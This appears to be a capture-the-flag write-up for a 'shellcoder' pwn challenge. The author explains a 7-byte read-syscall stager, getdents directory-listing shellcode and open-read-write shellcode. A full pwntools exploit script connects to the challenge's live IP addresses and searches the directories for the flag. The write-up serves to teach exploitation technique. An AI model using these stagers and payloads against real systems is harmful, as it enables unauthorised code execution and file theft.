```
who likes singing, dancing, rapping and shell-coding?

The directories on the server looks something like this:

...
├── flag
│   ├── unknown
│   │   └── ...
│   │       └── flag
│   └── unknown
└── shellcoder

nc 139.180.215.222 20002

nc 106.52.252.82 20002
```

After analyzing the binary we see that it reads 7 bytes of input, zero out all the registers and execute our 7-byte shellcode.
my first thought was that i could maybe jump back in the code somewhere so I analyzed the stack when it jumped to our code and get a bigger read somehow, but with no luck. Then I realized that rax is 0 and maybe I can get a read syscall in 7 bytes and the get a bigger shellcode in there.

So the registers when running my shellcode looked like this:

```
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0xdeadbeefcafe ◂— hlt     /* 0xf441414141414141 */
 RSI  0x0
 R8   0x0
 R9   0x0
 R10  0x0
 R11  0x0
 R12  0x0
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x0
 RSP  0xdeadbeefbabe ◂— 0xabadc0defee1dead
 RIP  0xdeadbeefcafe
```

And for the read syscall I need this:

```
 RAX 0x0		; syscall number
 ...
 RDI 0x0		; stdin fd
 RSI 0xdeadbeefcafe	; buffer in which to read the new shellcode
 RDX 0xff		; how much to read
 ...
```

# The plan:
* Write the size in $rdx
  * Since $rdx is 64 bit the `mov rdx, 0xff` would be to big
  * To save bytes we write the size in the lowest 8 bits of rdx
* Write the address from $rdi in $rsi and zero out $rdi
  * Again, to save bytes we do a `xchg rdi, rsi`

For the first stage this is the shellcode:

```python
read = asm('''
        mov dl, 0xff
        xchg rsi, rdi
        syscall
''', arch='amd64')
```

Now that I have enough space let's try to pop a shell... But there is no `/bin` folder...

After looking at a list of syscalls I saw `getdents` and decided to try it out. Locally it works kinda fine, the output is pretty unsanitized but I can work with that.

# New plan
* Read primitive
* List directory until I find the flag
  * Read a path from the user
  * Open the path
  * List directories
  * Repeat for every path found

This is the new shellcode:

```python
getdents = asm('''
          nop
          nop
          nop
          nop
          nop
          nop
          nop

          mov r8, rcx
          add r8, 0x7

          push 0x0
          sub rsp, 0xff

          mov rdx, 0xff
          mov rsi, rsp
          xor rdi, rdi
          xor rax, rax
          syscall

          xor rdx, rdx
          xor rsi, rsi
          mov rdi, rsp
          mov rax, 0x2
          syscall

          mov rdx, 0xff
          mov rsi, rsp
          mov rdi, rax
          mov rax, 0x4e
          syscall

          mov rdi, 0x1
          mov rax, rdi
          syscall

          jmp r8
''', arch='amd64')
```

And the final exploit (featuring backtracking, sanitization, open-read-write shellcode for the final path and fixing crashing connections):

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import string
import time

exe = context.binary = ELF('shellcoder')

host = args.HOST or '139.180.215.222'
port = int(args.PORT or 20002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
vmmap
'''.format(**locals())

# -- Exploit goes here --

def clean_read(folder, io):
    try:
        lines = io.recv()
    except EOFError:
        log.info('Starting new sessionin clean_read!')

        io.close()
        io = start()
        print(io.recv())

        io.send(read)
        io.send(getdents)

        time.sleep(0.25)

        io.send(folder)
        lines = io.recv()

    lines = lines.split('\x00')
    lines = [i.strip().replace('..', '') for i in lines]
    lines = [i for i in lines if all([j in string.ascii_letters + string.digits for j in i]) and i != '' and i != '.']

    return lines, io


def recurse(folder, io):
    if 'flag' not in folder[5:]:
        log.info('Trying: ' + folder)

        try:
            io.send(folder)
        except EOFError:
            log.info('Starting new session in recurse!')

            io.close()
            io = start()
            print(io.recv())

            io.send(read)
            io.send(getdents)

            time.sleep(0.25)

            io.send(folder)

        lines, io = clean_read(folder, io)

        for line in lines:
            recurse(folder + '/' + line, io)
    else:
        log.success('Found flag folder: ' + folder)

        io.close()
        io = start()
        print(io.recv())

        io.send(read)
        io.send(orw)

        time.sleep(0.25)

        io.send(folder)

context.terminal = ['tilix', '-e']

read = asm('''
        mov dl, 0xff
        xchg rsi, rdi
        syscall
''', arch='amd64')

getdents = asm('''
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        mov r8, rcx
        add r8, 0x7

        push 0x0
        sub rsp, 0xff

        mov rdx, 0xff
        mov rsi, rsp
        xor rdi, rdi
        xor rax, rax
        syscall

        xor rdx, rdx
        xor rsi, rsi
        mov rdi, rsp
        mov rax, 0x2
        syscall

        mov rdx, 0xff
        mov rsi, rsp
        mov rdi, rax
        mov rax, 0x4e
        syscall

        mov rdi, 0x1
        mov rax, rdi
        syscall

        jmp r8
''', arch='amd64')

orw = asm('''
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        push 0x0
        push 0x0
        push 0x0
        push 0x0
        push 0x0
        push 0x0

        mov rdx, 0x40
        mov rsi, rsp
        mov rdi, 0x0
        xor rax, rax
        syscall

        xor rdx, rdx
        xor rsi, rsi
        mov rdi, rsp
        mov rax, 0x2
        syscall

        mov rdx, 0x40
        mov rsi, rsp
        mov rdi, rax
        xor rax, rax
        syscall

        mov rdi, 0x1
        mov rax, 0x1
        syscall
''', arch='amd64')

log.info(disasm(read))
log.info(disasm(getdents))
log.info(disasm(orw))

io = start()
print(io.recv())

io.send(read)
io.send(getdents)
# io.send(orw)

time.sleep(1)

# io.send(raw_input('>>> ').strip())
# io.send('/flag/rrfh/lmc5/nswv/1rdr/zkz1/pim9/flag')

recurse('/flag', io)

io.interactive()
```
